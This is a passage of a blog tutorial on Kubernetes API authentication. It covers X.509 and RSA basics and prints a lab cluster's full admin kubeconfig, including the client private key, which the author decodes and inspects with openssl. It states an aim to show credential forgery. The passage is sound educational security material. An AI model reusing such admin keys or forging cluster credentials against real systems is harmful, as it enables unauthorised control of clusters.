---
layout: post
title:  "Kubernetes Authentication Deep Dive"
date:   2023-11-15 20:11:00 +1100
author: Stephen Bradshaw
tags:
- Kubernetes
- Authentication
- jwt
- x509
- RSA
- container
- containerd
---

In this post Im going to do a deep dive into two of the most commonly used authentication mechanisms for Kubernetes. 

I will cover:
* How the default forms of user and service account authentication in Kubernetes work and how you can perform them using curl
* A description of the cryptographic mechanisms that provide security for these authentication methods
* How you can forge your own credentials for both authentication methods given the right information

As well as providing detail on Kubernetes authentication, this post is also intended as a practical example to demonstrate how you can analyse a simple cryptosystem in order to attack it.


# Kubernetes test environment

For this blog post I will be using a simple Kubernetes system built on a single Ubuntu 22.04 VM. This is a throwaway reference system, not reachable from the Internet, setup purely for the purpose of this guide. I'm using a dedicated system because I will be showing some of it's critical secrets in this post, which you should never do for a system you actually intend to use.

I used [this guide](https://www.linuxtechi.com/install-kubernetes-on-ubuntu-22-04/) to setup Kubernetes, but skipped the sections on worker nodes section to create a single node clster. You can setup your own Kubernetes using the same guide if you want to follow along, it's a pretty quick process, but be aware specific keys and identifiers will look different from mine. 

If you are following this install guide and only using one node like me you will need to remove the "taint" on the master node to run additional containers on it. This is done by getting the node name using `kubectl get nodes` and then running the following command substituting your node name in the appropriate spot. 

You will need to do this **before** step 9 in the tutorial or the test nginx deployment will not launch.

```
stephen@kubemaster:~$ kubectl taint nodes <node_name> node-role.kubernetes.io/control-plane:NoSchedule-
```

# Kubernetes 101

This section will provide enough of an introduction to Kubernetes to understand the rest of this post. If you have used Kubernetes before and feel comfortable you understand what it is, feel free to skip ahead.

Kubernetes is an extensible framework of microservices that assist with running [containerised](https://kubernetes.io/docs/concepts/containers/) applications. Kubernetes runs on top of a container runtime such as docker or containerd, and the Kubernetes services run as containers themselves using this runtime. 

If you installed the Kubernetes base system as described in the previous section, we can use the [kubectl](https://kubernetes.io/docs/reference/kubectl/) admin tool to explore the system and see how it looks. List the [pods](https://kubernetes.io/docs/concepts/workloads/pods/) in the `kube-system` [namespace](https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/) and you will see some of the services that make Kubernetes work. Here is my list of pods running in this namespace created via the install guide in the previous section.

```
stephen@kubemaster:~$ kubectl get pods -n kube-system
NAME                                              READY   STATUS    RESTARTS   AGE
calico-kube-controllers-658d97c59c-88r9c          1/1     Running   0          127m
calico-node-fwptx                                 1/1     Running   0          127m
coredns-5dd5756b68-snhk5                          1/1     Running   0          128m
coredns-5dd5756b68-vlb88                          1/1     Running   0          128m
etcd-kubemaster.thezoo.local                      1/1     Running   0          128m
kube-apiserver-kubemaster.thezoo.local            1/1     Running   0          128m
kube-controller-manager-kubemaster.thezoo.local   1/1     Running   0          128m
kube-proxy-w2xfd                                  1/1     Running   0          128m
kube-scheduler-kubemaster.thezoo.local            1/1     Running   0          128m
```

Some of the more important pods you see include:
* [coredns](https://coredns.io/) to provide internal DNS services in the cluster
* [calico](https://docs.tigera.io/calico/latest/about/) to provide L3/L4 networking for the cluster
* [etcd](https://etcd.io/) that acts as a key-value datastore for the Kubernetes system
* [kube-scheduler](https://kubernetes.io/docs/concepts/scheduling-eviction/kube-scheduler/) which coordinates running containers on available nodes
* [kube-controller-manager](https://kubernetes.io/docs/reference/command-line-tools-reference/kube-controller-manager/) which maintains the cluster state
* [kube-proxy](https://kubernetes.io/docs/reference/command-line-tools-reference/kube-proxy/) which runs on each node and forwards traffic to containers 
* [kube-apiserver](https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/) which exposes a HTTP API that acts as the primary way to interface with Kubernetes as an admin or developer user of the system


Given that the API server is the primary way in which users of the system interact with Kubernetes, when I talk about Kubernetes authentication in this post, what I am referring to is authenticating to the API server. There are some other [edge](https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster) [cases](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/) with authentication, but we wont specifically consider those here.

# Kubernetes authentication overview

There are two categories of user in a Kubernetes system:
* **Normal users** - representing people configuring the Kubernetes install or using it to run containers. These are usually systems administrators or developers.
* **Service accounts** - respresenting system processes that run within the cluster. Running pods have a service account associated with them by default.

Kubernetes has an extensible authentication system for it's API server that is described in really good detail [here](https://kubernetes.io/docs/reference/access-authn-authz/authentication/). The extensibility does mean that there can be some variation in authentication configuration for custom Kubernetes installs, but default installs tend to support the methods I'll be talking about below. 

These methods are:
* **Normal user** - X.509 certificate based authentication
* **Service account** - JWT based authentication

Related to authentication (which is intended to verify the identity of an entity interacting with the system) is [authorization](https://kubernetes.io/docs/reference/access-authn-authz/authorization/) (determining what verified users are allowed to to in the system). I wont describe this in detail in this post but do want to mention that it exists as it will be referenced when I talk later on about forging user certificates later in the post.

You can verify the authorization methods in use by checking the runtime configuration of the API server using a command like the following. You will need to change the pod name in the command to that of your own API server by getting it's value using the `kubectl get pods -n kube-system` command as demonstrated in the previous section. The following shows that the [Node](https://kubernetes.io/docs/reference/access-authn-authz/node/) and [RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/) are enabled on my API server.

```
stephen@kubemaster:~$ kubectl describe pods kube-apiserver-kubemaster.thezoo.local  -n kube-system | grep authorization
      --authorization-mode=Node,RBAC
```

# RSA and X.509 101 

The use of RSA cryptography and X.509 certificates is central to the authentication methods Im about to discuss, so Im going to provide a quick overview of how they work for those who are unfamiliar. Feel free to skip ahead if you dont need the refresher.

## RSA

RSA refers to a public key cryptosystem, where key pairs, consisting of a private and a public key can be used to encrypt data for confidentiality and sign data to provide the identity of the private key owner. This is known as asymmetric encryption, where different keys are used for encrypting and decrypting, as opposed to symmetric encryption where the same key is used for both processes. The public key can be freely distributed and publicly associated with the keypairs owner in various ways. The private key is always kept private, and is an effective superset of both keys, although the reverse is not true. So, the public key can be extracted from the private, but the private key cannot be extracted from the public (at least for keys of sufficient size, although the size of "secure" keys grows with available computing power). The relationship between the keys is such that performing the cryptographic process with either of the keys is reversed by performing it with the paired key. 

Encryption (to keep data secret) is performed by running the algorithm using the public key. The transformed data can then only be converted to it's original form by using the private key - meaning only the private key owner can read data made secret with their public key. 

Signing (to prove a particular set of data originates from a given entity) is done using the private key. Usually, the data to be signed is hashed, and the hash is passed through the encryption algorithm to generate a signature. Then, when the signature is run through the RSA algorithm with the widely available public key, it should result in the same hash value that can be generated independantly from the data. If the hash generated from a given piece of data matches the signature verified using a particular public key, you can know that data came from an entity who has knowledge of the associate private key.

## X.509

X.509 is a standard for identifying entities within a system and associating them with a key pair that can be used for cryptographic operations. 

These certificates contain a number of standard and optional fields, that have been expanded upon in subsequent versions of the standard. We will look at some of the specific fields in more detail later. The certificates also contain a copy of the public key from the associated keypair and a signature that is used to verify the authenticity of the data by reference to a trusted authority. 

X.509 assists with verifying information in the certificates by providing a framework for certificates to exist in a chain of trust, where private keys from certificates higher in the chain of trust sign certificates below them in the chain. Certificates that are used to sign other certificates are associated with entities known as Certificate Authorities (CAs), and contain a specific field to identity the certificate as such. Chains of trust can have one or more CAs, all decendant from an original root CA, which is always self signed (meaning that it's own private key is used to generate it's signature). Systems using these chains distribute the CA certificates to allow them to be used as the basis of trust for the system. The Certificate Authority is the trusted authority in these systems - the one that ultimately verifies the identity of the other entities in the system.

Creating decendant certificates within a chain of trust commonly involves creating a Certificate Signing Request (CSR). The private key of a CA in the chain is then used to create a signature of the details in the CSR, which is combined with identifiers for the signing CA and the CSR field data to create a signed certificate. The CSR is thus a certificate template that contains all the desired fields of the certificate, and is usually fed into a process managed by the CA that verifies the details in the CSR before returning a signed certificate. Using the CSR, the CA can fulfil it's goal of confirming the accuracy of details presented in certificates in it's chain whilst still maintaining control of it's own private key.

Once they have their own certificate, entities in the chain of trust that are not CAs will usually use their associated keypair to perform additional cryptographic operations in the system. These operations are then tied to the identity information presented in the certificate. The specific way this occurs is system dependant, but usually involves additional signing or encrypting of data as mentioned above in the discussion on RSA. These certificates usually have fields included that define what specific cryptographic purposes the associated keys are intended to be used for.

An example of a cryptosystem using X.509 that most people will be familiar with is HTTPS (specifically its use of SSL/TLS for transport encryption). Multiple chains of trust are present here, provided by parties that can provide SSL certificates. The details of the related CAs are distributed with Operating Systems and HTTPS clients such as web browsers. When you visit a HTTPS site in your browser, the certificate (or chain of certificates) that is returned by the remote site to your web browser will need to be able to be matched back to a trusted certificate chain in your browsers certificate store to be trusted. The signature in the servers certificate will then need to be verified by the client using the public key from the matching Certificate Authority certificate. Once the signature of the certificate is verified and determined to be included in a valid chain of trust, then the details in the fields of the certificate can be considered. For example, is the certificate within it's validity period, does the domain name used for connection match the ones in the certificate, has the certificate been revoked, does the certificate purpose match server identification, etc. Once these details are established to the satisfaction of the client, the public and private keys associated with the servers certificate are then used for a key exchange that allows the communication between client and server to be encrypted. 

## RSA and X.509 summarised

So, in summary:
* RSA is an asymmetric cryptographic algorithm using keypairs consisting of public and private keys where the public key can be derived from the private but not vica versa
* The RSA private key is kept secret to allow the owner to identify themselves using signatures and to allow others to encrypt content only they can decrypt
* The RSA public key is distributed widely and allows others to verify the identify of private key owners via the key owners signatures or to encrypt data so that only the key owner can read it
* X.509 certificates exist in a chain of trust, beginning with a root CA which self signs it's own certificate, with certificates higher in the chain signing those beneath
* X.509 associates an asymmetric keypair with identifying information in a certificate, which is signed using the private key of a Certificate Authority in the chain
* X.509 CA certificates are associated with trusted system entities that can authenticate details about other entities in the system using signatures
* X.509 certificates associate identity information with the cryptographic operations performed in a cryptosystem using the certificates keypair


# User X.509 certificate based authentication

If you have been following along with the examples so far in this post you have already used X.509 user authentication to the Kubernetes cluster, perhaps without realising it. Let's look at how.

Installing Kubernetes as described in the previously mentioned setup guide created a highly privileged configuration file for use with the `kubectl` tool. The install guide advised copying this file from it's default location of `/etc/kubernetes/admin.conf` to `~/.kube/config`, where the `kubectl` tool can find it.

Mine looks like this:

```
stephen@kubemaster:~$ cat ~/.kube/config
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCVENDQWUyZ0F3SUJBZ0lJQnk2S2RmS2tRM2d3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TXpFeE1EZ3dNVEl3TkRaYUZ3MHpNekV4TURVd01USTFORFphTUJVeApFekFSQmdOVkJBTVRDbXQxWW1WeWJtVjBaWE13Z2dFaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQkR3QXdnZ0VLCkFvSUJBUUMrbFVpOGNIZFViY2JIVWJGWTJmQ1d4UTQrT245alY0aXNxWGV1eXNEK2h2VDRQYVk5VE0vT3pPd1AKT0ExWW15aFNUckFEbFMrampxZngvTzczY0UxNVN3NUpvVzNKeVRtbW84c3AxRThPREIwVTdZdE9WaXJSQk1lbgpsa0pTS1A5Qk1UTU5hSW5FYkgvOHpQNUkvWTVsY0lWR3k2YjFCWXNHLysvQndqNGJBUGdtN1pRZmtoa3lxWTJqCmp4Y1VoMC9INWJVRlhlRmR5RmhocXhJdkhhRHNLRzViaFZIUkVtdUxTSnNvVEc4eWdEL2kzbmh0a3hGMEtIeGoKQTErUUtkRGphVFlham5hY25aMmpHK0FGRU5NQzJOWXczckFNWC9QNTROcDZQOUprdWtDUytYSzJsQ3ZiM1BJcQpTYWRNSWorbElUVGplemJnY3cyY3YyQSs2QjVEQWdNQkFBR2pXVEJYTUE0R0ExVWREd0VCL3dRRUF3SUNwREFQCkJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJUZ1liRDROOGk3UGdwUzdPS3VFYjV4bEVIRW5EQVYKQmdOVkhSRUVEakFNZ2dwcmRXSmxjbTVsZEdWek1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQVVqUmlhWGZRTgphRTQ1VmN3NTIvYlhldi83WlpxN05kL2s4Q0Z5Z0tOcjJybWlOUWNJa0k3MXF2SUxEeEZoT3NOVWhhSVRHUU5aCmRZT2ZnN0Q5NzZhZ24xSHRjQUFtOUlJRUFpaG51OVNMWFc0c1F2WHBXWEcrelNOemQyMUpES0QvWXlyMm5DVE0KKzZqTVNRYmw5Z0dPalhDdUVTNGY3anlqRXRVREh5dHRpQ3hSRFVuelNvcG9ybEc4ai94emhQOGlaSEN6UlZHUAppbjlhL2lFeDlSZUNOcm5zS1NIN0p1QWZYMFl6TEFBSng1SldBNGozcW9JMmJQZ0F2L25hVU9pSmNrWVpUdWtzCndkQnJURFJUOGtycThKZ2NCTEJEa1Y2blVENDUrbGxIQUI4R3VuSFhkdElYdzR0S3RCdUxneGs0NEtVUUpkb3YKeHdmNXJ0dmZWajY2Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
    server: https://kubemaster.thezoo.local:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: kubernetes-admin
  name: kubernetes-admin@kubernetes
current-context: kubernetes-admin@kubernetes
kind: Config
preferences: {}
users:
- name: kubernetes-admin
  user:
    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJVENDQWdtZ0F3SUJBZ0lJV28rZ1plVWE3dzR3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TXpFeE1EZ3dNVEl3TkRaYUZ3MHlOREV4TURjd01USTFORGRhTURReApGekFWQmdOVkJBb1REbk41YzNSbGJUcHRZWE4wWlhKek1Sa3dGd1lEVlFRREV4QnJkV0psY201bGRHVnpMV0ZrCmJXbHVNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXloQjFlR2JmNjBUUjE5RmYKUVdYb1VmTFVNWUFERnUydDBrL1ZUbDNSYzN6VVU0bjlvYU9VME5EQ1psNzIxK3Z4RS9ISnZxdnIrTDkzbHBWTwpnRVo3dytXT1MyN2ViL2Nrd0pwYlRheHB2WGYxdFlqNm9ub1lGSUNuWTlCMGE2SG91dC9hZ1UzQUtSRmNTK0NGCkVKVU9udnkrOHF0Y1luT2RBR2Jpd1ZieXJDWlNsVVVQMnZvOWNpcC9hUUJsSk96NEs4bTlSa3hoUjFBV3FUdU4KQkRMWTVMUlN1SHNOWTRnTk8yankzcU5qUjBxS0RFZ29IMmhKUnFmR3M4ZWdMVFM3OVBMdnFkbHJ2di8waHdUWQp1UXVoNWZOWW5SRkZwR1RreFR1b2wvNWNBWmlnQkRraUtrR0c2UFR2R2tiRWd6QTNveDZIckljcFZNSHpEdzRRCjhUOEVMUUlEQVFBQm8xWXdWREFPQmdOVkhROEJBZjhFQkFNQ0JhQXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUgKQXdJd0RBWURWUjBUQVFIL0JBSXdBREFmQmdOVkhTTUVHREFXZ0JUZ1liRDROOGk3UGdwUzdPS3VFYjV4bEVIRQpuREFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBbmNuVnBDYUg5ck9GQkExMW5DalhISzAwRG13R1FJZnpjV2x0CkJ3RzRwR2lTK0RRR3ltODFwVEtHblhTQU1UZENvVmI2QzlrdWMrWkR0bG5iL05xZUk2WHpnVjdVbXp2V0E0N0gKSThvSHl5V3RjY1pNcUNwOTNnZUJDb3lZdW42SkpnTVozbHJhRTN6U1hxU0xzQ0hZWXpJZlRLWnFRdFFhbnBaNAp3SUVIMlBtZ1FxMmR4bmtoak9JSWF0bm54U0owdno1MDlXQVBQOStrSEpVeUh2N1V0a0pDL2J3aE5SdDh1RmluClBsN3Z3NGRUY1p4dS81SHlqcnlRcUVKUFBHS2ZnRlBja0dyclBXL1I1bUJHclVxRlZqYXN0TGQzekNMNG1GT0UKUWdyOTNMajh2ZnA1dFQrbFljRUkrYit3czdJaWFUQW9OdktVQXd4bXFmVzl2L1ZyZFE9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
    client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBeWhCMWVHYmY2MFRSMTlGZlFXWG9VZkxVTVlBREZ1MnQway9WVGwzUmMzelVVNG45Cm9hT1UwTkRDWmw3MjErdnhFL0hKdnF2citMOTNscFZPZ0VaN3crV09TMjdlYi9ja3dKcGJUYXhwdlhmMXRZajYKb25vWUZJQ25ZOUIwYTZIb3V0L2FnVTNBS1JGY1MrQ0ZFSlVPbnZ5KzhxdGNZbk9kQUdiaXdWYnlyQ1pTbFVVUAoydm85Y2lwL2FRQmxKT3o0SzhtOVJreGhSMUFXcVR1TkJETFk1TFJTdUhzTlk0Z05PMmp5M3FOalIwcUtERWdvCkgyaEpScWZHczhlZ0xUUzc5UEx2cWRscnZ2LzBod1RZdVF1aDVmTlluUkZGcEdUa3hUdW9sLzVjQVppZ0JEa2kKS2tHRzZQVHZHa2JFZ3pBM294NkhySWNwVk1IekR3NFE4VDhFTFFJREFRQUJBb0lCQURpZmhodVlVSFZBVXNGMApwWW5SQWRvOC91TmtLUGw2M3pQSk5WQUJrRmtaaVBKai85UVUzL1hvR2lIUHlNSlhGclp0RWdqQmFwM0pJYnpyCjJCU3dLNnlJbm1oYkNEQStCR21JbDc5YmFrSXk1SUxiZ01pWkNEaHVtUG1xaDRWRjJNN05QaER2OWNKTVlCM1AKSzlxcXVtOHBDbVU4U2VZNDJhMHNKNnpnTFo2NW12L1pwVWJrRDVXMGtFckNtcldWYXBrb0dHUzMraEVmZ0xuVQo3WmkwWmQxSm04RFpBcVBaZjB2K2xEcTRRNlA2cFRyWkZhSHRKeXE1R3BaaG5LdzFRSVAvZDM4SkdrWmJ2bDZTCmdLdWREZHR3UWtLWDhFc3hzUElzcHFYWmlJRnRHbEd4UjNWT3lSaXo1WlIvTDVQUDYvSHZ5QjZVMVMzU0MydW0KMGc1TW9xMENnWUVBNVA3K3J6Yjh0WkFQQzdMdTAwcm5CeUZLVWoyWUVKU3hwLy8wREtuWGtmcTZ2a01wZmo1TwpRNC8vcVJxMFBsTXlIbFF3dFpkVXdmb0Raem1tSUZGYkNucDhoYWl5Z3JVMldVZjRkc0Y4ZVExN0NPVHhURGkzCndqL3Z5MXNtaUw2OEVIMjNNeW94YitXamRaZUJKQVRSS05pWDFvbHFFUE5xVlRrd21TZkl2b01DZ1lFQTRlUncKWUNpKytqUnVwTEMzb0FvYzZWTU9zZllJdkhhTG5iQkx0SVVZWnFpaU5Namp1UHJnSE0vcnRCc3BPYmhWSCtpdQpOZ0YrS2pMa1ZsY0Rxd1NuQ20vcEdoVCtXeFhVdjNpRjRHSWQ5cm5iYVhRbklIbzNLWk56VzRKWDJ1b2d0dmFaCjVNS3JiVHg4QnpjRGhIMDFGdEtBM1VycGFTTU9vN3h2blVUTnM0OENnWUVBa05DbGRWN2J2MkpEOFkwTnRYZG4KMUwxN3g3aUdBdTVWenoxeE05VHdxN09aQnh0b0VSc0wyWFFtSk9YcldJSzZiaTJseENEWWkvYzAwY0hHU2lmSQo0RDZIb3VzRlFOMmlhaUcyZ2p0b0lSR2lYZ1NTaURaU0Z6amh4NE4wUWdRRTRKVHdGeDQydDJITTFsK2lYb25oClQraHhWVTMvVW9ydEVzb2c3cW9YTEVzQ2dZQkt4ek9JTVpUZkFRSnJsSENGRXpQMDdXRGMrcVJ6dHc2SzJmU0YKd3RXTURtRDc5bENrU0xCdCtVcCtxY3NnNTJ1T2o1azBHWlJwWmNWKzYzazBZT3JuSXByWTNvQkJLTjN2c0hjcApDM0g5M2hMTE92OUUyaEJ1dS9naEgrbnpkelB6UFhrK2FFOFZiME5qcEF1UERWL0l1VkNkY1JJSmt1aGl2WnQ1ClJYQ084d0tCZ0NFVGU1bm9xMFRHL2xVSFRnYVU0L3lBdi8rZjc5azlTOWw4a2xxR2RPSnBZZVZRVHdvSjZ1b1oKRndUMGhXYXdjK3NSWXRGeGxYMUhzV2huWmNLbVg3OGxJM2pLRDFwYXVrZURhVjFzQ0p4QnlIWVVSOXN2aWM5ZgplektZVHdCS1NLN2NPaTVPNFlPV3J1N255TTVXdEhHN25CVngxNmJTaHJRL2Nzc3A3UWVxCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==
```


Of note in this file are an external location for the API server in field `server` (https://kubemaster.thezoo.local:6443) and a number of base64 blobs of data labelled as `certificate-authority-data`, `client-certificate-data` and `client-key-data`. Let's extract these blobs out to disk and check them out.

## Analysing authentication data from the kubectl config file

First let's create a working directory for the files we will be analysing and change to it.

```
stephen@kubemaster:~$ mkdir certs
stephen@kubemaster:~$ cd certs
```

Now let's decode and dump to disk the first blob, for `certificate-authority-data` and see what's in it.
```
stephen@kubemaster:~/certs$ echo 'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCVENDQWUyZ0F3SUJBZ0lJQnk2S2RmS2tRM2d3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TXpFeE1EZ3dNVEl3TkRaYUZ3MHpNekV4TURVd01USTFORFphTUJVeApFekFSQmdOVkJBTVRDbXQxWW1WeWJtVjBaWE13Z2dFaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQkR3QXdnZ0VLCkFvSUJBUUMrbFVpOGNIZFViY2JIVWJGWTJmQ1d4UTQrT245alY0aXNxWGV1eXNEK2h2VDRQYVk5VE0vT3pPd1AKT0ExWW15aFNUckFEbFMrampxZngvTzczY0UxNVN3NUpvVzNKeVRtbW84c3AxRThPREIwVTdZdE9WaXJSQk1lbgpsa0pTS1A5Qk1UTU5hSW5FYkgvOHpQNUkvWTVsY0lWR3k2YjFCWXNHLysvQndqNGJBUGdtN1pRZmtoa3lxWTJqCmp4Y1VoMC9INWJVRlhlRmR5RmhocXhJdkhhRHNLRzViaFZIUkVtdUxTSnNvVEc4eWdEL2kzbmh0a3hGMEtIeGoKQTErUUtkRGphVFlham5hY25aMmpHK0FGRU5NQzJOWXczckFNWC9QNTROcDZQOUprdWtDUytYSzJsQ3ZiM1BJcQpTYWRNSWorbElUVGplemJnY3cyY3YyQSs2QjVEQWdNQkFBR2pXVEJYTUE0R0ExVWREd0VCL3dRRUF3SUNwREFQCkJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJUZ1liRDROOGk3UGdwUzdPS3VFYjV4bEVIRW5EQVYKQmdOVkhSRUVEakFNZ2dwcmRXSmxjbTVsZEdWek1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQVVqUmlhWGZRTgphRTQ1VmN3NTIvYlhldi83WlpxN05kL2s4Q0Z5Z0tOcjJybWlOUWNJa0k3MXF2SUxEeEZoT3NOVWhhSVRHUU5aCmRZT2ZnN0Q5NzZhZ24xSHRjQUFtOUlJRUFpaG51OVNMWFc0c1F2WHBXWEcrelNOemQyMUpES0QvWXlyMm5DVE0KKzZqTVNRYmw5Z0dPalhDdUVTNGY3anlqRXRVREh5dHRpQ3hSRFVuelNvcG9ybEc4ai94emhQOGlaSEN6UlZHUAppbjlhL2lFeDlSZUNOcm5zS1NIN0p1QWZYMFl6TEFBSng1SldBNGozcW9JMmJQZ0F2L25hVU9pSmNrWVpUdWtzCndkQnJURFJUOGtycThKZ2NCTEJEa1Y2blVENDUrbGxIQUI4R3VuSFhkdElYdzR0S3RCdUxneGs0NEtVUUpkb3YKeHdmNXJ0dmZWajY2Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K' | base64 -d > ca.crt
stephen@kubemaster:~/certs$ cat ca.crt
-----BEGIN CERTIFICATE-----
MIIDBTCCAe2gAwIBAgIIBy6KdfKkQ3gwDQYJKoZIhvcNAQELBQAwFTETMBEGA1UE
AxMKa3ViZXJuZXRlczAeFw0yMzExMDgwMTIwNDZaFw0zMzExMDUwMTI1NDZaMBUx
EzARBgNVBAMTCmt1YmVybmV0ZXMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQC+lUi8cHdUbcbHUbFY2fCWxQ4+On9jV4isqXeuysD+hvT4PaY9TM/OzOwP
OA1YmyhSTrADlS+jjqfx/O73cE15Sw5JoW3JyTmmo8sp1E8ODB0U7YtOVirRBMen
lkJSKP9BMTMNaInEbH/8zP5I/Y5lcIVGy6b1BYsG/+/Bwj4bAPgm7ZQfkhkyqY2j
jxcUh0/H5bUFXeFdyFhhqxIvHaDsKG5bhVHREmuLSJsoTG8ygD/i3nhtkxF0KHxj
A1+QKdDjaTYajnacnZ2jG+AFENMC2NYw3rAMX/P54Np6P9JkukCS+XK2lCvb3PIq
SadMIj+lITTjezbgcw2cv2A+6B5DAgMBAAGjWTBXMA4GA1UdDwEB/wQEAwICpDAP
BgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTgYbD4N8i7PgpS7OKuEb5xlEHEnDAV
BgNVHREEDjAMggprdWJlcm5ldGVzMA0GCSqGSIb3DQEBCwUAA4IBAQAUjRiaXfQN
aE45Vcw52/bXev/7ZZq7Nd/k8CFygKNr2rmiNQcIkI71qvILDxFhOsNUhaITGQNZ
dYOfg7D976agn1HtcAAm9IIEAihnu9SLXW4sQvXpWXG+zSNzd21JDKD/Yyr2nCTM
+6jMSQbl9gGOjXCuES4f7jyjEtUDHyttiCxRDUnzSoporlG8j/xzhP8iZHCzRVGP
in9a/iEx9ReCNrnsKSH7JuAfX0YzLAAJx5JWA4j3qoI2bPgAv/naUOiJckYZTuks
wdBrTDRT8krq8JgcBLBDkV6nUD45+llHAB8GunHXdtIXw4tKtBuLgxk44KUQJdov
xwf5rtvfVj66
-----END CERTIFICATE-----
```

This looks like a PEM encoded X.509 certificate. Let's parse it using openssl to try and understand what it's purpose is.

```
stephen@kubemaster:~/certs$ openssl x509 -in ca.crt -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 517503246380843896 (0x72e8a75f2a44378)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = kubernetes
        Validity
            Not Before: Nov  8 01:20:46 2023 GMT
            Not After : Nov  5 01:25:46 2033 GMT
        Subject: CN = kubernetes
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:be:95:48:bc:70:77:54:6d:c6:c7:51:b1:58:d9:
                    f0:96:c5:0e:3e:3a:7f:63:57:88:ac:a9:77:ae:ca:
                    c0:fe:86:f4:f8:3d:a6:3d:4c:cf:ce:cc:ec:0f:38:
                    0d:58:9b:28:52:4e:b0:03:95:2f:a3:8e:a7:f1:fc:
                    ee:f7:70:4d:79:4b:0e:49:a1:6d:c9:c9:39:a6:a3:
                    cb:29:d4:4f:0e:0c:1d:14:ed:8b:4e:56:2a:d1:04:
                    c7:a7:96:42:52:28:ff:41:31:33:0d:68:89:c4:6c:
                    7f:fc:cc:fe:48:fd:8e:65:70:85:46:cb:a6:f5:05:
                    8b:06:ff:ef:c1:c2:3e:1b:00:f8:26:ed:94:1f:92:
                    19:32:a9:8d:a3:8f:17:14:87:4f:c7:e5:b5:05:5d:
                    e1:5d:c8:58:61:ab:12:2f:1d:a0:ec:28:6e:5b:85:
                    51:d1:12:6b:8b:48:9b:28:4c:6f:32:80:3f:e2:de:
                    78:6d:93:11:74:28:7c:63:03:5f:90:29:d0:e3:69:
                    36:1a:8e:76:9c:9d:9d:a3:1b:e0:05:10:d3:02:d8:
                    d6:30:de:b0:0c:5f:f3:f9:e0:da:7a:3f:d2:64:ba:
                    40:92:f9:72:b6:94:2b:db:dc:f2:2a:49:a7:4c:22:
                    3f:a5:21:34:e3:7b:36:e0:73:0d:9c:bf:60:3e:e8:
                    1e:43
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment, Certificate Sign
            X509v3 Basic Constraints: critical
                CA:TRUE
            X509v3 Subject Key Identifier:
                E0:61:B0:F8:37:C8:BB:3E:0A:52:EC:E2:AE:11:BE:71:94:41:C4:9C
            X509v3 Subject Alternative Name:
                DNS:kubernetes
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        14:8d:18:9a:5d:f4:0d:68:4e:39:55:cc:39:db:f6:d7:7a:ff:
        fb:65:9a:bb:35:df:e4:f0:21:72:80:a3:6b:da:b9:a2:35:07:
        08:90:8e:f5:aa:f2:0b:0f:11:61:3a:c3:54:85:a2:13:19:03:
        59:75:83:9f:83:b0:fd:ef:a6:a0:9f:51:ed:70:00:26:f4:82:
        04:02:28:67:bb:d4:8b:5d:6e:2c:42:f5:e9:59:71:be:cd:23:
        73:77:6d:49:0c:a0:ff:63:2a:f6:9c:24:cc:fb:a8:cc:49:06:
        e5:f6:01:8e:8d:70:ae:11:2e:1f:ee:3c:a3:12:d5:03:1f:2b:
        6d:88:2c:51:0d:49:f3:4a:8a:68:ae:51:bc:8f:fc:73:84:ff:
        22:64:70:b3:45:51:8f:8a:7f:5a:fe:21:31:f5:17:82:36:b9:
        ec:29:21:fb:26:e0:1f:5f:46:33:2c:00:09:c7:92:56:03:88:
        f7:aa:82:36:6c:f8:00:bf:f9:da:50:e8:89:72:46:19:4e:e9:
        2c:c1:d0:6b:4c:34:53:f2:4a:ea:f0:98:1c:04:b0:43:91:5e:
        a7:50:3e:39:fa:59:47:00:1f:06:ba:71:d7:76:d2:17:c3:8b:
        4a:b4:1b:8b:83:19:38:e0:a5:10:25:da:2f:c7:07:f9:ae:db:
        df:56:3e:ba
```


There are a number of interesting features here. Let's list out some of the more important ones and discuss their meaning:
* **X509v3 Basic Constraints** - This contains the value `CA:TRUE` which identifies the certificate as a Certificate Authority - a certificate used to verify the trustworthiness of other certificates.
